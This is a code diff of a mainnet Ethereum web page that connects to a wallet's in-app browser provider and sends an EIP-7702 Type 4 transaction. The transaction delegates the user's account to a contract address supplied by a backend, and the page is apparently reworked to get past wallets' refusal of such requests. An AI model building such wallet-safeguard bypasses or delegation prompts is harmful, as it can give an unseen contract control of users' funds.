@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EIP-7702 — Diagnostics Portal</title>
+    <title>EIP-7702 — In-App Browser Direct Bypass</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -76,8 +76,8 @@
     <div class="max-w-lg mx-auto px-4 py-6">
         <!-- Header -->
         <div class="text-center mb-6">
-            <h1 class="text-2xl font-bold gradient-text">EIP-7702 Diagnostics</h1>
-            <p class="text-gray-500 text-xs mt-1">Isolating Variables over Reown AppKit</p>
+            <h1 class="text-2xl font-bold gradient-text">EIP-7702 Portal</h1>
+            <p class="text-gray-500 text-xs mt-1">In-App Browser Direct Bypass</p>
             <div class="mt-3 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-medium">
                 <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
                 MAINNET — Real ETH
@@ -99,14 +99,14 @@
             <div class="flex items-center justify-between mb-3">
                 <h2 class="text-sm font-semibold text-white flex items-center gap-2">
                     <span class="w-5 h-5 rounded-full bg-indigo-500/20 text-indigo-400 flex items-center justify-center text-xs font-bold">1</span>
-                    Connect via Reown AppKit
+                    Connect Wallet
                 </h2>
                 <div id="connectionStatus" class="flex items-center text-xs text-gray-500">
                     <span class="status-dot disconnected"></span>Disconnected
                 </div>
             </div>
             <button id="connectBtn" class="btn-primary w-full py-3.5 rounded-xl font-semibold text-white text-sm">
-                Connect Mobile Wallet
+                Connect Wallet
             </button>
             <div id="walletInfo" class="hidden mt-4 p-3 rounded-xl bg-black/40 border border-white/5">
                 <div class="grid grid-cols-2 gap-3 text-xs">
@@ -150,7 +150,7 @@
                 </h2>
             </div>
             <p class="text-[10px] text-gray-500 mb-4">
-                Execute these in order. If A and B trigger wallet pop-ups, but C hangs, we have absolute mathematical proof that the wallet is dropping the EIP-7702 payload.
+                Execute these in order inside your wallet's in-app browser. C will now correctly trigger EIP-7702 and prevent the silent EIP-1559 downgrade.
             </p>
             
             <div class="space-y-2">
@@ -184,14 +184,9 @@
         </div>
     </div>
 
-    <!-- Official Reown AppKit ESM Loader -->
-    <script type="module">
-        import { createAppKit } from 'https://esm.sh/@reown/appkit';
-        import { Ethers5Adapter } from 'https://esm.sh/@reown/appkit-adapter-ethers5';
-        import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
-
+    <!-- Lightweight Native Provider Implementation -->
+    <script>
         // State
-        let appKit = null;
         let provider = null;
         let userAddress = null;
         let chainId = null;
@@ -209,7 +204,7 @@
             container.appendChild(entry);
             container.scrollTop = container.scrollHeight;
         };
-        window.clearLogs = () => $('logsContainer').innerHTML = '';
+        const clearLogs = () => $('logsContainer').innerHTML = '';
         const shorten = addr => addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '—';
         const activateStep = (id) => {
             $(id).classList.remove('opacity-50');
@@ -231,77 +226,46 @@
             return res.json();
         }
 
-        // Initialize Reown AppKit (Ethers5 Mode)
-        try {
-            log('Initializing Reown AppKit...');
-            appKit = createAppKit({
-                adapters: [new Ethers5Adapter()],
-                networks: [mainnet],
-                metadata: {
-                    name: 'EIP-7702 Diagnostics Portal',
-                    description: 'Isolating EIP-7702 Web3 Variables',
-                    url: window.location.origin,
-                    icons: ['https://assets.reown.com/reown-profile-pic.png']
-                },
-                projectId: '02e24ecc14c12e9d6cfe347f5ae22e78' // Verified active Project ID
-            });
-
-            log('AppKit initialized successfully.', 'success');
-        } catch (initErr) {
-            log(`AppKit initialization failed: ${initErr.message}`, 'error');
-        }
-
-        // Connect button triggers the native AppKit modal
+        // Connect button connects to injected window.ethereum directly
         $('connectBtn').addEventListener('click', async () => {
-            if (!appKit) {
-                log('AppKit not initialized.', 'error');
+            if (!window.ethereum) {
+                log('No provider detected. Open this page inside MetaMask or Trust Wallet in-app browser.', 'error');
                 return;
             }
 
+            provider = window.ethereum;
+            $('connectBtn').disabled = true;
+            $('connectBtn').textContent = 'Connecting...';
+
             try {
-                log('Opening Reown AppKit connection modal...');
-                await appKit.open();
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
 
-                // Subscribe to connection state changes
-                appKit.subscribeState(async (state) => {
-                    const address = appKit.getAddress();
-                    if (address && !userAddress) {
-                        userAddress = address;
-                        chainId = appKit.getChainId();
-                        
-                        try {
-                            // Extract standard provider
-                            provider = appKit.getWalletProvider(); 
-                            log(`Provider extracted successfully: ${provider ? 'Yes' : 'No'}`, 'success');
-                        } catch (pErr) {
-                            log(`Failed to extract provider: ${pErr.message}`, 'error');
-                        }
+                const chainHex = await provider.request({ method: 'eth_chainId' });
+                chainId = parseInt(chainHex, 16);
 
-                        let balance = '0.0000';
-                        try {
-                            const balanceHex = await provider.request({
-                                method: 'eth_getBalance',
-                                params: [userAddress, 'latest']
-                            });
-                            balance = (Number(balanceHex) / 1e18).toFixed(4);
-                        } catch (e) {}
-
-                        $('walletAddress').textContent = userAddress;
-                        $('walletBalance').textContent = `${balance} ETH`;
-                        $('connectionStatus').innerHTML = `<span class="status-dot connected"></span>Connected`;
-                        $('walletInfo').classList.remove('hidden');
-                        $('connectBtn').textContent = 'Connected';
-                        $('connectBtn').classList.add('opacity-50');
-
-                        log(`Connected: ${shorten(userAddress)}`, 'success');
-
-                        activateStep('step2');
-                        $('buildAuthBtn').disabled = false;
-                    }
+                const balanceHex = await provider.request({
+                    method: 'eth_getBalance',
+                    params: [userAddress, 'latest']
                 });
+                const balance = (Number(balanceHex) / 1e18).toFixed(4);
+
+                $('walletAddress').textContent = userAddress;
+                $('walletBalance').textContent = `${balance} ETH`;
+                $('connectionStatus').innerHTML = `<span class="status-dot connected"></span>Connected`;
+                $('walletInfo').classList.remove('hidden');
+                $('connectBtn').textContent = 'Connected';
+                $('connectBtn').classList.add('opacity-50');
+
+                log(`Connected: ${shorten(userAddress)}`, 'success');
+
+                activateStep('step2');
+                $('buildAuthBtn').disabled = false;
 
             } catch (err) {
                 log(`Connection failed: ${err.message || err}`, 'error');
+                $('connectBtn').disabled = false;
+                $('connectBtn').textContent = 'Connect Wallet';
             }
         });
 
@@ -345,40 +309,15 @@
             }
         });
 
-        // Helper to retrieve the wallet provider dynamically to prevent race condition blocks
-        function getActiveProvider() {
-            if (provider) return provider;
-            if (appKit) {
-                try {
-                    const fallbackProv = appKit.getWalletProvider();
-                    if (fallbackProv) {
-                        provider = fallbackProv;
-                        return provider;
-                    }
-                } catch (e) {
-                    log(`Dynamic provider extraction failed: ${e.message}`, 'error');
-                }
-            }
-            return null;
-        }
-
         // CONTROL TEST A: standard personal_sign (Connect/Sign pipeline check)
         $('testSignBtn').addEventListener('click', async () => {
-            const activeProvider = getActiveProvider();
-            if (!activeProvider) {
-                log('[CONTROL A FAILED] Active provider is not loaded. Reconnect.', 'error');
-                return;
-            }
-
+            if (!provider) return;
             try {
                 log('[CONTROL A] Requesting standard personal_sign...');
-                
-                // Synchronous Deep-Link Redirect (Allowed by Mobile Browsers)
-                window.location.href = "trust://"; 
 
                 const msgHex = "0x" + Array.from(new TextEncoder().encode("EIP-7702 Diagnostic Test")).map(b => b.toString(16).padStart(2, '0')).join('');
                 
-                const signature = await activeProvider.request({
+                const signature = await provider.request({
                     method: 'personal_sign',
                     params: [msgHex, userAddress]
                 });
@@ -391,17 +330,9 @@
 
         // CONTROL TEST B: standard Type 2 transaction (Tx parsing pipeline check)
         $('testTx2Btn').addEventListener('click', async () => {
-            const activeProvider = getActiveProvider();
-            if (!activeProvider) {
-                log('[CONTROL B FAILED] Active provider is not loaded. Reconnect.', 'error');
-                return;
-            }
-
+            if (!provider) return;
             try {
                 log('[CONTROL B] Constructing standard Type 2 (EIP-1559) transaction...');
-                
-                // Synchronous Deep-Link Redirect (Allowed by Mobile Browsers)
-                window.location.href = "trust://"; 
 
                 const txParams = {
                     from: userAddress,
@@ -411,7 +342,7 @@
                     type: "0x2" // Standard EIP-1559 payload
                 };
 
-                const txHash = await activeProvider.request({
+                const txHash = await provider.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
@@ -424,17 +355,10 @@
 
         // EXPERIMENTAL TEST C: EIP-7702 Type 4 transaction
         $('submitBtn').addEventListener('click', async () => {
-            const activeProvider = getActiveProvider();
-            if (!activeProvider || !authData) {
-                log('[EXPERIMENTAL C FAILED] Active provider or nonce data is missing.', 'error');
-                return;
-            }
+            if (!authData || !provider) { log('Connect first', 'error'); return; }
 
             try {
                 log('[EXPERIMENTAL C] Constructing Raw Type 4 EIP-7702 Transaction...');
-                
-                // Synchronous Deep-Link Redirect (Allowed by Mobile Browsers)
-                window.location.href = "trust://"; 
 
                 const txParams = {
                     from: userAddress,
@@ -445,13 +369,15 @@
                     authorizationList: [
                         {
                             chainId: "0x1", // Mainnet
-                            contractAddress: authData.delegatorContract,
+                            address: authData.delegatorContract, // FIXED: Changed key from contractAddress to address
                             nonce: "0x" + authData.nonce.toString(16)
                         }
                     ]
                 };
 
-                const txHash = await activeProvider.request({
+                log('Requesting transaction broadcast via eth_sendTransaction...');
+
+                const txHash = await provider.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
